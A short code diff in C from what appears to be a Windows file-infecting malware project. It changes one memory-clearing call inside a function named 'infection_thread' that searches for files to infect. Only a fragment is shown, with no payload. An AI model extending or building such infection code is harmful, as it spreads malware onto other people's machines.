@@ -41,7 +41,7 @@ DWORD WINAPI infection_thread(LPVOID param) {
     }
     PRINT_DEBUG("search pattern: %s", search_pattern);
 
-    memzero(&find_data, sizeof(WIN32_FIND_DATAA));
+    memzero_local(&find_data, sizeof(WIN32_FIND_DATAA));
     h_find = FIND_FIRST_FILE_A(search_pattern, &find_data);
     if (h_find != INVALID_HANDLE_VALUE) {
         do {
